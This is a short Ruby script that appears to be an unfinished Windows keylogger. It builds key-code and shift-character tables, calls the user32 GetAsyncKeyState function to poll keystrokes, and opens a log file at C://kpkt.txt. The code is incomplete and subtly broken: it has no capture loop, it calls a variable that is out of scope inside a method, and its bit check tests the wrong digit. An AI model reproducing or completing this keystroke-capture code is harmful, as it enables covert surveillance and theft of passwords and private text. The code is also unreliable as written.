require 'Win32API'

LSHIFT = 0xA0
RSHIFT = 0xA1

# create empty Hash of key codes
keys = Hash.new

# create empty Hash for shift characters
uppercase = Hash.new

# add letters
(0x41..0x5A).each { |code| keys[code.chr.downcase] = code }

# add numbers
(0x30..0x39).each { |code| keys[code-0x30] = code }

# add special characters
keys[';'] = 0xBA; keys['='] = 0xBB; keys[','] = 0xBC; keys['-'] = 0xBD; keys['.'] = 0xBE 
keys['/'] = 0xBF; keys['`'] = 0xC0; keys['['] = 0xDB; keys[']'] = 0xDD; keys["'"] = 0xDE 
keys['\\'] = 0xDC

# add for uppercase letters
('a'..'z').each { |char| uppercase[char] = char.upcase }

# add for uppercase numbers
uppercase['1'] = '!'; uppercase['2'] = '@'; uppercase['3'] = '#'; uppercase['4'] = '$'; uppercase['5'] = '%'
uppercase['6'] = '^'; uppercase['7'] = '&'; uppercase['8'] = '*'; uppercase['9'] = '('; uppercase['0'] = ')'

# add for uppercase special characters
uppercase[';'] = ':'; uppercase['='] = '+'; uppercase[','] = '<'; uppercase['-'] = '_'; uppercase['.'] = '>'
uppercase['/'] = '?'; uppercase['`'] = '~'; uppercase['['] = '{'; uppercase[']'] = '}'; uppercase["'"] = '"'
uppercase['\\'] = '|'

# create a listener for Windows key-presses
listener = Win32API.new('user32', 'GetAsyncKeyState', ['i'], 'i')

# check to see if the most significant bit is set
def check_msb(n)
	return n.to_s(2)[0]
end

# check to see if the least significant bit is set
def check_lsb(n)
	return n.to_s(2)[-1]
end

# check to see if either shift key is currently being pressed
def check_shifts()
	return false unless check_msb(listener.call(LSHIFT)) or check_msb(listener.call(RSHIFT))
	return true
end

logs = File.open('C://kpkt.txt', 'a')
logs.close()